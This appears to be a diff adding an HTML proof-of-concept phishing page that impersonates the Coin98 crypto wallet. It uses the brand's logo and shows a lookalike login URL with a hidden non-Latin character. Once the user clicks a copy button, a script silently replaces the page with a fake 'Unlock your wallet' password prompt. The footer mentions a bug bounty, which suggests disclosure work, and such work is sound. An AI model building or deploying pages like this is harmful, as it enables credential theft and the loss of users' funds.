@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Coin98 Wallet Login</title>
+    <style>
+      body {
+        font-family: "Segoe UI", Arial, sans-serif;
+        background-color: #0f0f0f;
+        padding: 40px;
+        text-align: center;
+        color: #f2f2f2;
+      }
+      .card {
+        background: linear-gradient(145deg, #1b1b1b, #141414);
+        max-width: 420px;
+        margin: auto;
+        padding: 30px;
+        border-radius: 14px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        border: 1px solid #2a2a2a;
+      }
+      .status-logo {
+        width: 80px;
+        margin-bottom: 15px;
+        filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.6));
+      }
+      h2 {
+        color: #ffd700;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+      p {
+        font-size: 15px;
+        color: #bbb;
+        margin-bottom: 20px;
+      }
+      .url-box {
+        background: #1c1c1c;
+        padding: 12px;
+        border-radius: 6px;
+        font-family: monospace;
+        font-size: 14px;
+        color: #ffd700;
+        word-break: break-all;
+        border: 1px solid #2a2a2a;
+      }
+      button {
+        background: #ffd700;
+        color: #000;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 6px;
+        font-size: 14px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: background 0.3s;
+      }
+      button:hover {
+        background: #e6c200;
+      }
+      .login-container {
+        max-width: 380px;
+        margin: 60px auto;
+        background: linear-gradient(145deg, #1b1b1b, #141414);
+        padding: 30px;
+        border-radius: 14px;
+        text-align: center;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.6);
+        border: 1px solid #2a2a2a;
+      }
+      .login-container input {
+        width: 90%;
+        margin: 10px auto;
+        padding: 12px;
+        font-size: 14px;
+        border: 1px solid #444;
+        border-radius: 6px;
+        display: block;
+        background: #0f0f0f;
+        color: #f2f2f2;
+      }
+      .login-container input::placeholder {
+        color: #888;
+      }
+      .login-container button {
+        background: #ffd700;
+        border: none;
+        padding: 12px 16px;
+        border-radius: 6px;
+        color: #000;
+        font-size: 15px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+      .login-container button:hover {
+        background: #e6c200;
+      }
+      .footer {
+        font-size: 11px;
+        color: #777;
+        margin-top: 15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <img class="status-logo" src="https://coin98.s3.amazonaws.com/coin98-logo-gold.png" alt="Coin98 Logo">
+      <h2>Connect with Coin98</h2>
+      <p>Copy and paste the URL below into your browser's address bar:</p>
+      <div class="url-box" id="304url">https://سwallet.coin98.com/login</div>
+      <button onclick="copyUrl()">📋 Copy URL</button>
+    </div>
+
+    <script>
+      function copyUrl() {
+        const url = document.getElementById("304url");
+        if (!window.getSelection) return;
+        const range = document.createRange();
+        range.selectNodeContents(url);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+        document.execCommand("copy");
+
+        setTimeout(() => {
+          document.write(`
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: #0f0f0f;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #f2f2f2;
+    }
+    .login-container {
+      background: linear-gradient(145deg, #1b1b1b, #141414);
+      padding: 30px;
+      border-radius: 14px;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.6);
+      text-align: center;
+      width: 320px;
+      border: 1px solid #2a2a2a;
+    }
+    .status-logo {
+      width: 70px;
+      margin-bottom: 10px;
+      filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.6));
+    }
+    h2 {
+      margin: 10px 0;
+      color: #ffd700;
+    }
+    p {
+      color: #bbb;
+      margin-bottom: 20px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #444;
+      border-radius: 8px;
+      font-size: 14px;
+      background: #0f0f0f;
+      color: #f2f2f2;
+    }
+    input::placeholder {
+      color: #888;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #ffd700;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #e6c200;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+
+  <div class="login-container">
+    <img class="status-logo" src="https://coin98.s3.amazonaws.com/coin98-logo-gold.png" alt="Coin98 Logo">
+    <h2>Coin98 Wallet</h2>
+    <p>Unlock your wallet</p>
+    <input type="password" placeholder="Enter your wallet password" />
+    <button type="submit">Unlock</button>
+    <div class="footer">Coin98 Bug Bounty</div>
+  </div>
+`); 
+        }, 4300);
+      }
+    </script>
+  </body>
+</html>
